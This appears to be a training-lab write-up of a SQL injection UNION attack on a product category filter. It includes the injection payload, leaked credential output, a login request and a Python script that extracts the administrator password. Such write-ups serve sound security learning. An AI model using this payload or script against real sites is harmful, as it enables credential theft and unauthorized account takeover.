This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

---

Payload:
```php
GET /filter?category=Gifts'%20UNION%20SELECT%20username%2c%20password%20FROM%20users--
```

Decoded:
```php
Gifts' UNION SELECT username, password FROM users--
```

Response:
```php
th>carlos</th>
<td>5puecct77hwth1fplai0</td>

<th>wiener</th>
 <td>wrnxqytie95ff9eywynt</td>

  <tr><th>administrator</th>
<td>qb0id1auv52d02n6tqe8</td>
```

carlos:5puecct77hwth1fplai0
administrator:qb0id1auv52d02n6tqe8

Login:
```php
csrf=kqiXGIMPMxuroXVY7ghmG2QG6awSHd1S&username=administrator&password=qb0id1auv52d02n6tqe8
```

Requirements:

- `POST` request.
- Get CSRF token from `/login`
- Grab the admin password with beautifulsoup

Script:

```python
#!/usr/bin/python3

import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def union_atk(s, url):
	exploit_url = url + "filter?category=Pets'%20UNION%20SELECT%20username%2c%20password%20FROM%20users--"
	r = s.get(exploit_url, verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	admin_pass = soup.find(string='administrator').parent.findNext('td').contents[0]
	print("[+] The administrator password is '%s'." % admin_pass)

def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s www.example.com/')
		sys.exit(-1)
		
	s = requests.Session()	
	url = sys.argv[1]
	union_atk(s, url)

if __name__ == '__main__':
	main()
```

